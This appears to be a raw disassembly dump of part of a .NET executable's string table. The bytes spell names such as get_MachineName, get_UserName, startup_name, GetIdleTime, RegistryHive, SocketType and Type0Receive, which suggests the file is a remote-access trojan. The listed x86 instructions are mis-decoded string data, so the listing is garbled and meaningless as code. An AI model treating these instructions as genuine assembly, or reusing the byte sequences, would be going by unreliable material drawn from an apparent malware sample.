  409950:	6f                   	outsl  %ds:(%esi),(%dx)
  409951:	63 00                	arpl   %eax,(%eax)
  409953:	47                   	inc    %edi
  409954:	65 74 57             	gs je  0x4099ae
  409957:	69 6e 64 6f 77 54 68 	imul   $0x6854776f,0x64(%esi),%ebp
  40995e:	72 65                	jb     0x4099c5
  409960:	61                   	popa
  409961:	64 50                	fs push %eax
  409963:	72 6f                	jb     0x4099d4
  409965:	63 65 73             	arpl   %esp,0x73(%ebp)
  409968:	73 49                	jae    0x4099b3
  40996a:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
  40996e:	74 53                	je     0x4099c3
  409970:	65 74 49             	gs je  0x4099bc
  409973:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  409977:	74 50                	je     0x4099c9
  409979:	72 6f                	jb     0x4099ea
  40997b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40997e:	73 42                	jae    0x4099c2
  409980:	79 49                	jns    0x4099cb
  409982:	64 00 54 68 72       	add    %dl,%fs:0x72(%eax,%ebp,2)
  409987:	65 61                	gs popa
  409989:	64 00 4c 6f 61       	add    %cl,%fs:0x61(%edi,%ebp,2)
  40998e:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  409992:	64 00 43 6f          	add    %al,%fs:0x6f(%ebx)
  409996:	6d                   	insl   (%dx),%es:(%edi)
  409997:	70 72                	jo     0x409a0b
  409999:	65 73 73             	gs jae 0x409a0f
  40999c:	65 64 00 67 65       	gs add %ah,%fs:0x65(%edi)
  4099a1:	74 5f                	je     0x409a02
  4099a3:	43                   	inc    %ebx
  4099a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4099a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4099a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4099a7:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4099ac:	00 41 77             	add    %al,0x77(%ecx)
  4099af:	61                   	popa
  4099b0:	69 74 55 6e 73 61 66 	imul   $0x65666173,0x6e(%ebp,%edx,2),%esi
  4099b7:	65 
  4099b8:	4f                   	dec    %edi
  4099b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4099ba:	43                   	inc    %ebx
  4099bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4099bc:	6d                   	insl   (%dx),%es:(%edi)
  4099bd:	70 6c                	jo     0x409a2b
  4099bf:	65 74 65             	gs je  0x409a27
  4099c2:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  4099c6:	74 5f                	je     0x409a27
  4099c8:	49                   	dec    %ecx
  4099c9:	73 43                	jae    0x409a0e
  4099cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4099cc:	6d                   	insl   (%dx),%es:(%edi)
  4099cd:	70 6c                	jo     0x409a3b
  4099cf:	65 74 65             	gs je  0x409a37
  4099d2:	64 00 72 65          	add    %dh,%fs:0x65(%edx)
  4099d6:	74 69                	je     0x409a41
  4099d8:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  4099dc:	61                   	popa
  4099dd:	64 54                	fs push %esp
  4099df:	6f                   	outsl  %ds:(%esi),(%dx)
  4099e0:	45                   	inc    %ebp
  4099e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4099e2:	64 00 68 57          	add    %ch,%fs:0x57(%eax)
  4099e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4099e7:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  4099eb:	70 65                	jo     0x409a52
  4099ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4099ee:	64 00 47 65          	add    %al,%fs:0x65(%edi)
  4099f2:	74 4d                	je     0x409a41
  4099f4:	65 74 68             	gs je  0x409a5f
  4099f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4099f8:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  4099fc:	70 6c                	jo     0x409a6a
  4099fe:	61                   	popa
  4099ff:	63 65 00             	arpl   %esp,0x0(%ebp)
  409a02:	67 65 74 5f          	addr16 gs je 0x409a65
  409a06:	53                   	push   %ebx
  409a07:	74 61                	je     0x409a6a
  409a09:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  409a0c:	72 61                	jb     0x409a6f
  409a0e:	63 65 00             	arpl   %esp,0x0(%ebp)
  409a11:	43                   	inc    %ebx
  409a12:	72 65                	jb     0x409a79
  409a14:	61                   	popa
  409a15:	74 65                	je     0x409a7c
  409a17:	49                   	dec    %ecx
  409a18:	6e                   	outsb  %ds:(%esi),(%dx)
  409a19:	73 74                	jae    0x409a8f
  409a1b:	61                   	popa
  409a1c:	6e                   	outsb  %ds:(%esi),(%dx)
  409a1d:	63 65 00             	arpl   %esp,0x0(%ebp)
  409a20:	43                   	inc    %ebx
  409a21:	72 79                	jb     0x409a9c
  409a23:	70 74                	jo     0x409a99
  409a25:	6f                   	outsl  %ds:(%esi),(%dx)
  409a26:	53                   	push   %ebx
  409a27:	74 72                	je     0x409a9b
  409a29:	65 61                	gs popa
  409a2b:	6d                   	insl   (%dx),%es:(%edi)
  409a2c:	4d                   	dec    %ebp
  409a2d:	6f                   	outsl  %ds:(%esi),(%dx)
  409a2e:	64 65 00 41 64       	fs add %al,%gs:0x64(%ecx)
  409a33:	64 53                	fs push %ebx
  409a35:	75 62                	jne    0x409a99
  409a37:	4e                   	dec    %esi
  409a38:	6f                   	outsl  %ds:(%esi),(%dx)
  409a39:	64 65 00 73 75       	fs add %dh,%gs:0x75(%ebx)
  409a3e:	62 4e 6f             	bound  %ecx,0x6f(%esi)
  409a41:	64 65 00 4d 61       	fs add %cl,%gs:0x61(%ebp)
  409a46:	69 6e 4e 6f 64 65 00 	imul   $0x65646f,0x4e(%esi),%ebp
  409a4d:	6e                   	outsb  %ds:(%esi),(%dx)
  409a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  409a4f:	64 65 00 4c 6f 63    	fs add %cl,%gs:0x63(%edi,%ebp,2)
  409a55:	61                   	popa
  409a56:	6c                   	insb   (%dx),%es:(%edi)
  409a57:	46                   	inc    %esi
  409a58:	72 65                	jb     0x409abf
  409a5a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409a5e:	74 5f                	je     0x409abf
  409a60:	4d                   	dec    %ebp
  409a61:	65 73 73             	gs jae 0x409ad7
  409a64:	61                   	popa
  409a65:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  409a6a:	76 6f                	jbe    0x409adb
  409a6c:	6b 65 00 67          	imul   $0x67,0x0(%ebp),%esp
  409a70:	65 74 5f             	gs je  0x409ad2
  409a73:	41                   	inc    %ecx
  409a74:	76 61                	jbe    0x409ad7
  409a76:	69 6c 61 62 6c 65 00 	imul   $0x4500656c,0x62(%ecx,%eiz,2),%ebp
  409a7d:	45 
  409a7e:	6e                   	outsb  %ds:(%esi),(%dx)
  409a7f:	75 6d                	jne    0x409aee
  409a81:	65 72 61             	gs jb  0x409ae5
  409a84:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  409a88:	49                   	dec    %ecx
  409a89:	44                   	inc    %esp
  409a8a:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  409a91:	6c                   	insb   (%dx),%es:(%edi)
  409a92:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  409a96:	6e                   	outsb  %ds:(%esi),(%dx)
  409a97:	74 69                	je     0x409b02
  409a99:	6d                   	insl   (%dx),%es:(%edi)
  409a9a:	65 46                	gs inc %esi
  409a9c:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  409aa3:	64 6c                	fs insb (%dx),%es:(%edi)
  409aa5:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  409aa9:	6f                   	outsl  %ds:(%esi),(%dx)
  409aaa:	73 65                	jae    0x409b11
  409aac:	48                   	dec    %eax
  409aad:	61                   	popa
  409aae:	6e                   	outsb  %ds:(%esi),(%dx)
  409aaf:	64 6c                	fs insb (%dx),%es:(%edi)
  409ab1:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  409ab5:	6c                   	insb   (%dx),%es:(%edi)
  409ab6:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  409aba:	6e                   	outsb  %ds:(%esi),(%dx)
  409abb:	73 6f                	jae    0x409b2c
  409abd:	6c                   	insb   (%dx),%es:(%edi)
  409abe:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  409ac2:	74 5f                	je     0x409b23
  409ac4:	57                   	push   %edi
  409ac5:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  409acc:	79 6c                	jns    0x409b3a
  409ace:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  409ad2:	6f                   	outsl  %ds:(%esi),(%dx)
  409ad3:	63 65 73             	arpl   %esp,0x73(%ebp)
  409ad6:	73 57                	jae    0x409b2f
  409ad8:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  409adf:	79 6c                	jns    0x409b4d
  409ae1:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409ae5:	74 5f                	je     0x409b46
  409ae7:	4e                   	dec    %esi
  409ae8:	61                   	popa
  409ae9:	6d                   	insl   (%dx),%es:(%edi)
  409aea:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  409aee:	74 5f                	je     0x409b4f
  409af0:	46                   	inc    %esi
  409af1:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  409af8:	00 
  409af9:	47                   	inc    %edi
  409afa:	65 74 54             	gs je  0x409b51
  409afd:	65 6d                	gs insl (%dx),%es:(%edi)
  409aff:	70 46                	jo     0x409b47
  409b01:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  409b08:	00 
  409b09:	47                   	inc    %edi
  409b0a:	65 74 46             	gs je  0x409b53
  409b0d:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  409b14:	00 
  409b15:	67 65 74 5f          	addr16 gs je 0x409b78
  409b19:	4d                   	dec    %ebp
  409b1a:	61                   	popa
  409b1b:	63 68 69             	arpl   %ebp,0x69(%eax)
  409b1e:	6e                   	outsb  %ds:(%esi),(%dx)
  409b1f:	65 4e                	gs dec %esi
  409b21:	61                   	popa
  409b22:	6d                   	insl   (%dx),%es:(%edi)
  409b23:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409b27:	74 5f                	je     0x409b88
  409b29:	55                   	push   %ebp
  409b2a:	73 65                	jae    0x409b91
  409b2c:	72 4e                	jb     0x409b7c
  409b2e:	61                   	popa
  409b2f:	6d                   	insl   (%dx),%es:(%edi)
  409b30:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409b34:	74 5f                	je     0x409b95
  409b36:	50                   	push   %eax
  409b37:	72 6f                	jb     0x409ba8
  409b39:	63 65 73             	arpl   %esp,0x73(%ebp)
  409b3c:	73 4e                	jae    0x409b8c
  409b3e:	61                   	popa
  409b3f:	6d                   	insl   (%dx),%es:(%edi)
  409b40:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409b44:	73 65                	jae    0x409bab
  409b46:	6d                   	insl   (%dx),%es:(%edi)
  409b47:	62 6c 79 4e          	bound  %ebp,0x4e(%ecx,%edi,2)
  409b4b:	61                   	popa
  409b4c:	6d                   	insl   (%dx),%es:(%edi)
  409b4d:	65 00 73 74          	add    %dh,%gs:0x74(%ebx)
  409b51:	61                   	popa
  409b52:	72 74                	jb     0x409bc8
  409b54:	75 70                	jne    0x409bc6
  409b56:	5f                   	pop    %edi
  409b57:	6e                   	outsb  %ds:(%esi),(%dx)
  409b58:	61                   	popa
  409b59:	6d                   	insl   (%dx),%es:(%edi)
  409b5a:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  409b5e:	74 49                	je     0x409ba9
  409b60:	64 6c                	fs insb (%dx),%es:(%edi)
  409b62:	65 54                	gs push %esp
  409b64:	69 6d 65 00 44 61 74 	imul   $0x74614400,0x65(%ebp),%ebp
  409b6b:	65 54                	gs push %esp
  409b6d:	69 6d 65 00 64 77 54 	imul   $0x54776400,0x65(%ebp),%ebp
  409b74:	69 6d 65 00 41 70 70 	imul   $0x70704100,0x65(%ebp),%ebp
  409b7b:	65 6e                	outsb  %gs:(%esi),(%dx)
  409b7d:	64 4c                	fs dec %esp
  409b7f:	69 6e 65 00 57 72 69 	imul   $0x69725700,0x65(%esi),%ebp
  409b86:	74 65                	je     0x409bed
  409b88:	4c                   	dec    %esp
  409b89:	69 6e 65 00 67 65 74 	imul   $0x74656700,0x65(%esi),%ebp
  409b90:	5f                   	pop    %edi
  409b91:	4e                   	dec    %esi
  409b92:	65 77 4c             	gs ja  0x409be1
  409b95:	69 6e 65 00 49 41 73 	imul   $0x73414900,0x65(%esi),%ebp
  409b9c:	79 6e                	jns    0x409c0c
  409b9e:	63 53 74             	arpl   %edx,0x74(%ebx)
  409ba1:	61                   	popa
  409ba2:	74 65                	je     0x409c09
  409ba4:	4d                   	dec    %ebp
  409ba5:	61                   	popa
  409ba6:	63 68 69             	arpl   %ebp,0x69(%eax)
  409ba9:	6e                   	outsb  %ds:(%esi),(%dx)
  409baa:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  409bae:	74 53                	je     0x409c03
  409bb0:	74 61                	je     0x409c13
  409bb2:	74 65                	je     0x409c19
  409bb4:	4d                   	dec    %ebp
  409bb5:	61                   	popa
  409bb6:	63 68 69             	arpl   %ebp,0x69(%eax)
  409bb9:	6e                   	outsb  %ds:(%esi),(%dx)
  409bba:	65 00 73 74          	add    %dh,%gs:0x74(%ebx)
  409bbe:	61                   	popa
  409bbf:	74 65                	je     0x409c26
  409bc1:	4d                   	dec    %ebp
  409bc2:	61                   	popa
  409bc3:	63 68 69             	arpl   %ebp,0x69(%eax)
  409bc6:	6e                   	outsb  %ds:(%esi),(%dx)
  409bc7:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  409bcb:	6c                   	insb   (%dx),%es:(%edi)
  409bcc:	75 65                	jne    0x409c33
  409bce:	54                   	push   %esp
  409bcf:	79 70                	jns    0x409c41
  409bd1:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  409bd5:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  409bd8:	79 70                	jns    0x409c4a
  409bda:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  409bde:	6f                   	outsl  %ds:(%esi),(%dx)
  409bdf:	74 6f                	je     0x409c50
  409be1:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409be4:	54                   	push   %esp
  409be5:	79 70                	jns    0x409c57
  409be7:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  409beb:	74 54                	je     0x409c41
  409bed:	79 70                	jns    0x409c5f
  409bef:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  409bf3:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409bf6:	74 54                	je     0x409c4c
  409bf8:	79 70                	jns    0x409c6a
  409bfa:	65 00 74 79 70       	add    %dh,%gs:0x70(%ecx,%edi,2)
  409bff:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  409c03:	74 65                	je     0x409c6a
  409c05:	41                   	inc    %ecx
  409c06:	72 72                	jb     0x409c7a
  409c08:	61                   	popa
  409c09:	79 43                	jns    0x409c4e
  409c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  409c0c:	6d                   	insl   (%dx),%es:(%edi)
  409c0d:	70 61                	jo     0x409c70
  409c0f:	72 65                	jb     0x409c76
  409c11:	00 53 79             	add    %dl,0x79(%ebx)
  409c14:	73 74                	jae    0x409c8a
  409c16:	65 6d                	gs insl (%dx),%es:(%edi)
  409c18:	2e 43                	cs inc %ebx
  409c1a:	6f                   	outsl  %ds:(%esi),(%dx)
  409c1b:	72 65                	jb     0x409c82
  409c1d:	00 4d 65             	add    %cl,0x65(%ebp)
  409c20:	74 68                	je     0x409c8a
  409c22:	6f                   	outsl  %ds:(%esi),(%dx)
  409c23:	64 42                	fs inc %edx
  409c25:	61                   	popa
  409c26:	73 65                	jae    0x409c8d
  409c28:	00 43 6c             	add    %al,0x6c(%ebx)
  409c2b:	6f                   	outsl  %ds:(%esi),(%dx)
  409c2c:	73 65                	jae    0x409c93
  409c2e:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  409c32:	70 6f                	jo     0x409ca3
  409c34:	73 65                	jae    0x409c9b
  409c36:	00 42 54             	add    %al,0x54(%edx)
  409c39:	72 75                	jb     0x409cb0
  409c3b:	6e                   	outsb  %ds:(%esi),(%dx)
  409c3c:	63 61 74             	arpl   %esp,0x74(%ecx)
  409c3f:	65 00 43 72          	add    %al,%gs:0x72(%ebx)
  409c43:	65 61                	gs popa
  409c45:	74 65                	je     0x409cac
  409c47:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  409c4a:	31 5f 5f             	xor    %ebx,0x5f(%edi)
  409c4d:	73 74                	jae    0x409cc3
  409c4f:	61                   	popa
  409c50:	74 65                	je     0x409cb7
  409c52:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  409c56:	65 74 65             	gs je  0x409cbe
  409c59:	00 57 72             	add    %dl,0x72(%edi)
  409c5c:	69 74 65 00 43 6f 6d 	imul   $0x706d6f43,0x0(%ebp,%eiz,2),%esi
  409c63:	70 
  409c64:	69 6c 65 72 47 65 6e 	imul   $0x656e6547,0x72(%ebp,%eiz,2),%ebp
  409c6b:	65 
  409c6c:	72 61                	jb     0x409ccf
  409c6e:	74 65                	je     0x409cd5
  409c70:	64 41                	fs inc %ecx
  409c72:	74 74                	je     0x409ce8
  409c74:	72 69                	jb     0x409cdf
  409c76:	62 75 74             	bound  %esi,0x74(%ebp)
  409c79:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  409c7d:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  409c84:	62 
  409c85:	75 74                	jne    0x409cfb
  409c87:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  409c8c:	75 67                	jne    0x409cf5
  409c8e:	67 61                	addr16 popa
  409c90:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  409c94:	74 74                	je     0x409d0a
  409c96:	72 69                	jb     0x409d01
  409c98:	62 75 74             	bound  %esi,0x74(%ebp)
  409c9b:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  409c9f:	6d                   	insl   (%dx),%es:(%edi)
  409ca0:	56                   	push   %esi
  409ca1:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  409ca8:	74 74                	je     0x409d1e
  409caa:	72 69                	jb     0x409d15
  409cac:	62 75 74             	bound  %esi,0x74(%ebp)
  409caf:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409cb3:	73 65                	jae    0x409d1a
  409cb5:	6d                   	insl   (%dx),%es:(%edi)
  409cb6:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  409cba:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  409cc1:	72 
  409cc2:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  409cc9:	73 79                	jae    0x409d44
  409ccb:	6e                   	outsb  %ds:(%esi),(%dx)
  409ccc:	63 53 74             	arpl   %edx,0x74(%ebx)
  409ccf:	61                   	popa
  409cd0:	74 65                	je     0x409d37
  409cd2:	4d                   	dec    %ebp
  409cd3:	61                   	popa
  409cd4:	63 68 69             	arpl   %ebp,0x69(%eax)
  409cd7:	6e                   	outsb  %ds:(%esi),(%dx)
  409cd8:	65 41                	gs inc %ecx
  409cda:	74 74                	je     0x409d50
  409cdc:	72 69                	jb     0x409d47
  409cde:	62 75 74             	bound  %esi,0x74(%ebp)
  409ce1:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409ce5:	73 65                	jae    0x409d4c
  409ce7:	6d                   	insl   (%dx),%es:(%edi)
  409ce8:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  409cec:	72 61                	jb     0x409d4f
  409cee:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  409cf1:	61                   	popa
  409cf2:	72 6b                	jb     0x409d5f
  409cf4:	41                   	inc    %ecx
  409cf5:	74 74                	je     0x409d6b
  409cf7:	72 69                	jb     0x409d62
  409cf9:	62 75 74             	bound  %esi,0x74(%ebp)
  409cfc:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  409d01:	67 65 74 46          	addr16 gs je 0x409d4b
  409d05:	72 61                	jb     0x409d68
  409d07:	6d                   	insl   (%dx),%es:(%edi)
  409d08:	65 77 6f             	gs ja  0x409d7a
  409d0b:	72 6b                	jb     0x409d78
  409d0d:	41                   	inc    %ecx
  409d0e:	74 74                	je     0x409d84
  409d10:	72 69                	jb     0x409d7b
  409d12:	62 75 74             	bound  %esi,0x74(%ebp)
  409d15:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  409d1a:	75 67                	jne    0x409d83
  409d1c:	67 65 72 48          	addr16 gs jb 0x409d68
  409d20:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  409d27:	74 
  409d28:	72 69                	jb     0x409d93
  409d2a:	62 75 74             	bound  %esi,0x74(%ebp)
  409d2d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409d31:	73 65                	jae    0x409d98
  409d33:	6d                   	insl   (%dx),%es:(%edi)
  409d34:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  409d38:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  409d3f:	69 
  409d40:	6f                   	outsl  %ds:(%esi),(%dx)
  409d41:	6e                   	outsb  %ds:(%esi),(%dx)
  409d42:	41                   	inc    %ecx
  409d43:	74 74                	je     0x409db9
  409d45:	72 69                	jb     0x409db0
  409d47:	62 75 74             	bound  %esi,0x74(%ebp)
  409d4a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409d4e:	73 65                	jae    0x409db5
  409d50:	6d                   	insl   (%dx),%es:(%edi)
  409d51:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  409d55:	6f                   	outsl  %ds:(%esi),(%dx)
  409d56:	6e                   	outsb  %ds:(%esi),(%dx)
  409d57:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  409d5d:	74 69                	je     0x409dc8
  409d5f:	6f                   	outsl  %ds:(%esi),(%dx)
  409d60:	6e                   	outsb  %ds:(%esi),(%dx)
  409d61:	41                   	inc    %ecx
  409d62:	74 74                	je     0x409dd8
  409d64:	72 69                	jb     0x409dcf
  409d66:	62 75 74             	bound  %esi,0x74(%ebp)
  409d69:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409d6d:	73 65                	jae    0x409dd4
  409d6f:	6d                   	insl   (%dx),%es:(%edi)
  409d70:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  409d74:	65 73 63             	gs jae 0x409dda
  409d77:	72 69                	jb     0x409de2
  409d79:	70 74                	jo     0x409def
  409d7b:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  409d82:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  409d89:	6f                   	outsl  %ds:(%esi),(%dx)
  409d8a:	6d                   	insl   (%dx),%es:(%edi)
  409d8b:	70 69                	jo     0x409df6
  409d8d:	6c                   	insb   (%dx),%es:(%edi)
  409d8e:	61                   	popa
  409d8f:	74 69                	je     0x409dfa
  409d91:	6f                   	outsl  %ds:(%esi),(%dx)
  409d92:	6e                   	outsb  %ds:(%esi),(%dx)
  409d93:	52                   	push   %edx
  409d94:	65 6c                	gs insb (%dx),%es:(%edi)
  409d96:	61                   	popa
  409d97:	78 61                	js     0x409dfa
  409d99:	74 69                	je     0x409e04
  409d9b:	6f                   	outsl  %ds:(%esi),(%dx)
  409d9c:	6e                   	outsb  %ds:(%esi),(%dx)
  409d9d:	73 41                	jae    0x409de0
  409d9f:	74 74                	je     0x409e15
  409da1:	72 69                	jb     0x409e0c
  409da3:	62 75 74             	bound  %esi,0x74(%ebp)
  409da6:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409daa:	73 65                	jae    0x409e11
  409dac:	6d                   	insl   (%dx),%es:(%edi)
  409dad:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  409db1:	72 6f                	jb     0x409e22
  409db3:	64 75 63             	fs jne 0x409e19
  409db6:	74 41                	je     0x409df9
  409db8:	74 74                	je     0x409e2e
  409dba:	72 69                	jb     0x409e25
  409dbc:	62 75 74             	bound  %esi,0x74(%ebp)
  409dbf:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409dc3:	73 65                	jae    0x409e2a
  409dc5:	6d                   	insl   (%dx),%es:(%edi)
  409dc6:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  409dca:	6f                   	outsl  %ds:(%esi),(%dx)
  409dcb:	70 79                	jo     0x409e46
  409dcd:	72 69                	jb     0x409e38
  409dcf:	67 68 74 41 74 74    	addr16 push $0x74744174
  409dd5:	72 69                	jb     0x409e40
  409dd7:	62 75 74             	bound  %esi,0x74(%ebp)
  409dda:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409dde:	73 65                	jae    0x409e45
  409de0:	6d                   	insl   (%dx),%es:(%edi)
  409de1:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  409de5:	6f                   	outsl  %ds:(%esi),(%dx)
  409de6:	6d                   	insl   (%dx),%es:(%edi)
  409de7:	70 61                	jo     0x409e4a
  409de9:	6e                   	outsb  %ds:(%esi),(%dx)
  409dea:	79 41                	jns    0x409e2d
  409dec:	74 74                	je     0x409e62
  409dee:	72 69                	jb     0x409e59
  409df0:	62 75 74             	bound  %esi,0x74(%ebp)
  409df3:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  409df7:	6e                   	outsb  %ds:(%esi),(%dx)
  409df8:	74 69                	je     0x409e63
  409dfa:	6d                   	insl   (%dx),%es:(%edi)
  409dfb:	65 43                	gs inc %ebx
  409dfd:	6f                   	outsl  %ds:(%esi),(%dx)
  409dfe:	6d                   	insl   (%dx),%es:(%edi)
  409dff:	70 61                	jo     0x409e62
  409e01:	74 69                	je     0x409e6c
  409e03:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  409e06:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  409e0d:	69 
  409e0e:	62 75 74             	bound  %esi,0x74(%ebp)
  409e11:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  409e15:	74 5f                	je     0x409e76
  409e17:	55                   	push   %ebp
  409e18:	73 65                	jae    0x409e7f
  409e1a:	53                   	push   %ebx
  409e1b:	68 65 6c 6c 45       	push   $0x456c6c65
  409e20:	78 65                	js     0x409e87
  409e22:	63 75 74             	arpl   %esi,0x74(%ebp)
  409e25:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  409e29:	74 65                	je     0x409e90
  409e2b:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  409e2f:	65 74 65             	gs je  0x409e97
  409e32:	56                   	push   %esi
  409e33:	61                   	popa
  409e34:	6c                   	insb   (%dx),%es:(%edi)
  409e35:	75 65                	jne    0x409e9c
  409e37:	00 47 65             	add    %al,0x65(%edi)
  409e3a:	74 56                	je     0x409e92
  409e3c:	61                   	popa
  409e3d:	6c                   	insb   (%dx),%es:(%edi)
  409e3e:	75 65                	jne    0x409ea5
  409e40:	00 53 65             	add    %dl,0x65(%ebx)
  409e43:	74 56                	je     0x409e9b
  409e45:	61                   	popa
  409e46:	6c                   	insb   (%dx),%es:(%edi)
  409e47:	75 65                	jne    0x409eae
  409e49:	00 47 65             	add    %al,0x65(%edi)
  409e4c:	74 50                	je     0x409e9e
  409e4e:	72 6f                	jb     0x409ebf
  409e50:	70 65                	jo     0x409eb7
  409e52:	72 74                	jb     0x409ec8
  409e54:	79 56                	jns    0x409eac
  409e56:	61                   	popa
  409e57:	6c                   	insb   (%dx),%es:(%edi)
  409e58:	75 65                	jne    0x409ebf
  409e5a:	00 76 61             	add    %dh,0x61(%esi)
  409e5d:	6c                   	insb   (%dx),%es:(%edi)
  409e5e:	75 65                	jne    0x409ec5
  409e60:	00 52 65             	add    %dl,0x65(%edx)
  409e63:	67 69 73 74 72 79 48 	imul   $0x69487972,0x74(%bp,%di),%esi
  409e6a:	69 
  409e6b:	76 65                	jbe    0x409ed2
  409e6d:	00 54 79 70          	add    %dl,0x70(%ecx,%edi,2)
  409e71:	65 30 52 65          	xor    %dl,%gs:0x65(%edx)
  409e75:	63 65 69             	arpl   %esp,0x69(%ebp)
  409e78:	76 65                	jbe    0x409edf
  409e7a:	00 54 79 70          	add    %dl,0x70(%ecx,%edi,2)
  409e7e:	65 31 52 65          	xor    %edx,%gs:0x65(%edx)
  409e82:	63 65 69             	arpl   %esp,0x69(%ebp)
  409e85:	76 65                	jbe    0x409eec
  409e87:	00 54 79 70          	add    %dl,0x70(%ecx,%edi,2)
  409e8b:	65 32 52 65          	xor    %gs:0x65(%edx),%dl
  409e8f:	63 65 69             	arpl   %esp,0x69(%ebp)
  409e92:	76 65                	jbe    0x409ef9
  409e94:	00 61 64             	add    %ah,0x64(%ecx)
  409e97:	64 5f                	fs pop %edi
  409e99:	41                   	inc    %ecx
  409e9a:	73 73                	jae    0x409f0f
  409e9c:	65 6d                	gs insl (%dx),%es:(%edi)
